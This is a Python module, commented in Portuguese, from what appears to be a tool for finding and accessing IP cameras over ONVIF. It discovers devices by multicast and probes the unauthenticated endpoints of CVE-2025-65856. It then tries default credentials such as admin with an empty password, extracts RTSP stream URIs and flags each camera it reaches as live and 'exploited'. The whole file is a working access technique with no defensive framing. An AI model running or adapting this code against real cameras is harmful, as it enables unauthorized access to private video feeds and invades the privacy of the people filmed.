"""
ONVIF — descoberta de câmaras e stream URIs (Técnica 2).

Suporta:
- WS-Discovery multicast para descobrir ONVIF
- GetProfiles + GetStreamUri para obter RTSP URIs
- CVE-2025-65856 — endpoints ONVIF sem auth (Xiongmaitech)
"""

from __future__ import annotations

import logging

import requests

from procurador.core.models import (
    AccessMethod,
    Camera,
    CameraStatus,
)
from procurador.core.wordlists import ONVIF_PORTS, ONVIF_UNAUTH_ENDPOINTS
from procurador.utils.helpers import safe_run

logger = logging.getLogger(__name__)


# =====================================================================
# WS-Discovery (multicast)
# =====================================================================


def onvif_discover(timeout: float = 4.0) -> list[dict]:
    """Descobre dispositivos ONVIF via WS-Discovery multicast.

    Returns:
        Lista de dicts {ip, port, urls, xaddrs, types}.
    """
    devices: list[dict] = []
    try:
        from wsdiscovery import WSDiscovery

        wsd = WSDiscovery()
        wsd.start()
        try:
            services = wsd.searchServices(timeout=timeout)
        finally:
            wsd.stop()

        for svc in services:
            try:
                xaddrs = list(svc.getXAddrs()) if hasattr(svc, "getXAddrs") else []
                ips: list[str] = []
                ports: list[int] = []
                for xa in xaddrs:
                    # xa = "http://192.168.1.100:8080/onvif/device_service"
                    if "://" in xa:
                        host_part = xa.split("://", 1)[1]
                        host_part = host_part.split("/", 1)[0]
                        if ":" in host_part:
                            h, p = host_part.rsplit(":", 1)
                            try:
                                ports.append(int(p))
                            except ValueError:
                                pass
                            ips.append(h)
                        else:
                            ips.append(host_part)

                devices.append(
                    {
                        "ips": ips,
                        "ports": ports or [80],
                        "urls": xaddrs,
                        "types": list(svc.getTypes()) if hasattr(svc, "getTypes") else [],
                    }
                )
            except Exception as e:
                logger.debug(f"parse wsd service err: {e}")
    except ImportError:
        logger.debug("wsdiscovery não instalado")
    except Exception as e:
        logger.debug(f"WS-Discovery erro: {e}")

    return devices


# =====================================================================
# ONVIF GetStreamUri (onvif-python)
# =====================================================================


def onvif_get_stream_uris(
    ip: str,
    port: int = 80,
    user: str = "admin",
    password: str = "",
    timeout: float = 5.0,
) -> list[dict]:
    """Obtém RTSP URIs via ONVIF GetProfiles + GetStreamUri.

    Args:
        ip, port: Endereço do serviço ONVIF.
        user, password: Credenciais.
        timeout: Timeout de conexão.

    Returns:
        Lista de dicts {token, rtsp, resolution, encoding}.
    """
    result: list[dict] = []
    try:
        from onvif import ONVIFCamera

        cam = ONVIFCamera(ip, port, user, password, wsdl_dir=None, adjustTime=False)
        media = cam.create_media_service()
        profiles = media.GetProfiles()
        for p in profiles:
            try:
                uri = media.GetStreamUri(
                    {
                        "StreamSetup": {
                            "Stream": "RTP-Unicast",
                            "Transport": {"Protocol": "RTSP"},
                        },
                        "ProfileToken": p.token,
                    }
                )
                # Resolução
                resolution = "N/A"
                try:
                    v = p.VideoEncoderConfiguration
                    if v and v.Resolution:
                        resolution = f"{v.Resolution.Width}x{v.Resolution.Height}"
                except Exception:
                    pass
                # Encoding
                encoding = "N/A"
                try:
                    encoding = p.VideoEncoderConfiguration.Encoding
                except Exception:
                    pass

                result.append(
                    {
                        "token": p.token,
                        "rtsp": uri.Uri,
                        "resolution": resolution,
                        "encoding": encoding,
                    }
                )
            except Exception as e:
                logger.debug(f"GetStreamUri err: {e}")
                continue
    except ImportError:
        logger.debug("onvif-python não instalado")
    except Exception as e:
        logger.debug(f"onvif stream {ip}:{port} err: {e}")

    return result


def onvif_get_device_info(
    ip: str,
    port: int = 80,
    user: str = "admin",
    password: str = "",
) -> dict:
    """Obtém device info via ONVIF GetDeviceInformation."""
    info: dict = {}
    try:
        from onvif import ONVIFCamera

        cam = ONVIFCamera(ip, port, user, password, wsdl_dir=None, adjustTime=False)
        d = cam.devicemgmt.GetDeviceInformation()
        info = {
            "manufacturer": d.Manufacturer,
            "model": d.Model,
            "firmware": d.FirmwareVersion,
            "serial": d.SerialNumber,
            "hardware_id": d.HardwareId,
        }
    except Exception as e:
        logger.debug(f"onvif device info {ip}:{port} err: {e}")
    return info


# =====================================================================
# CVE-2025-65856 — ONVIF sem auth
# =====================================================================


def test_onvif_no_auth(
    ip: str,
    ports: list[int] | None = None,
    timeout: float = 5.0,
) -> dict | None:
    """Testa CVE-2025-65856 (Xiongmaitech): ONVIF endpoints sem auth.

    Args:
        ip: IP da câmara.
        ports: Portas HTTP a testar.
        timeout: Timeout por pedido.

    Returns:
        Dict com {port, endpoint, response} se encontrar endpoint sem auth.
        None se nenhum endpoint respondeu.
    """
    if ports is None:
        ports = ONVIF_PORTS

    # SOAP request para GetDeviceInformation
    soap_request = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
               xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
  <soap:Header/>
  <soap:Body>
    <tds:GetDeviceInformation/>
  </soap:Body>
</soap:Envelope>"""

    for port in ports:
        for endpoint in ONVIF_UNAUTH_ENDPOINTS:
            url = f"http://{ip}:{port}{endpoint}"
            try:
                resp = requests.post(
                    url,
                    data=soap_request,
                    headers={"Content-Type": "application/soap+xml; charset=utf-8"},
                    timeout=timeout,
                )
                if resp.status_code == 200 and "<soap" in resp.text.lower():
                    logger.info(f"🔓 CVE-2025-65856 ONVIF no auth: {url}")
                    return {
                        "ip": ip,
                        "port": port,
                        "endpoint": endpoint,
                        "url": url,
                        "response": resp.text[:4096],
                    }
            except requests.exceptions.RequestException:
                continue
            except Exception as e:
                logger.debug(f"onvif no-auth {url} err: {e}")
    return None


# =====================================================================
# Pipeline ONVIF
# =====================================================================


def probe_onvif(
    camera: Camera,
    user: str = "admin",
    password: str = "",
    timeout: float = 4.0,
    try_no_auth: bool = True,
) -> Camera:
    """Pipeline ONVIF completo (Técnica 2).

    1. Tenta CVE-2025-65856 (ONVIF sem auth)
    2. Tenta com creds default
    3. Extrai stream URIs e marca a câmara como LIVE

    Args:
        camera: Camera a testar.
        user, password: Credenciais default.
        timeout: Timeout.
        try_no_auth: Tentar CVE-2025-65856 primeiro.

    Returns:
        Camera atualizada.
    """
    if camera.status == CameraStatus.LIVE:
        return camera

    # 1. CVE-2025-65856 — ONVIF sem auth
    if try_no_auth:
        result = safe_run(
            test_onvif_no_auth,
            camera.ip,
            timeout=timeout,
            log_errors=False,
        )
        if result:
            camera.onvif_supported = True
            camera.onvif_url = result["url"]
            camera.cve_exploited = "CVE-2025-65856"
            camera.tags.append("CVE-2025-65856")

            # Tentar extrair stream URIs do response (se houver)
            # Geralmente o endpoint sem auth dá info mas não profiles
            # Mesmo assim, marcar como descoberta ONVIF

    # 2. Tentar com credenciais default
    for port in (80, 8080, 2020):
        try:
            uris = onvif_get_stream_uris(camera.ip, port, user, password, timeout=timeout)
        except Exception as e:
            logger.debug(f"onvif_get_stream_uris err: {e}")
            uris = []

        if uris:
            camera.onvif_supported = True
            camera.onvif_url = f"http://{camera.ip}:{port}/onvif/device_service"
            camera.onvif_profiles = [u["token"] for u in uris]
            camera.onvif_stream_uris = [u["rtsp"] for u in uris]

            # A primeira URI é o main stream
            first = uris[0]
            camera.rtsp_url = first["rtsp"]
            # Parsear porta e path do RTSP URI
            rtsp_url = first["rtsp"]
            if "://" in rtsp_url:
                host_part = rtsp_url.split("://", 1)[1]
                if "@" in host_part:
                    host_part = host_part.split("@", 1)[1]
                if "/" in host_part:
                    hp, path = host_part.split("/", 1)
                    path = "/" + path
                else:
                    hp, path = host_part, "/"
                if ":" in hp:
                    h, p = hp.rsplit(":", 1)
                    try:
                        camera.port = int(p)
                    except ValueError:
                        pass
                camera.rtsp_path = path

            # Stream info
            res = first.get("resolution", "N/A")
            if "x" in res:
                try:
                    w, h = res.split("x", 1)
                    from procurador.core.models import StreamInfo

                    camera.stream = StreamInfo(
                        codec=first.get("encoding"),
                        width=int(w),
                        height=int(h),
                    )
                except (ValueError, ImportError):
                    pass

            camera.status = CameraStatus.LIVE
            camera.auth_required = False
            camera.auth_success = True
            camera.access_method = AccessMethod.ONVIF
            camera.tags.append("onvif")
            logger.info(f"🟢 LIVE (ONVIF) {camera.ip}:{port} {len(uris)} stream(s) {res}")
            return camera

    return camera
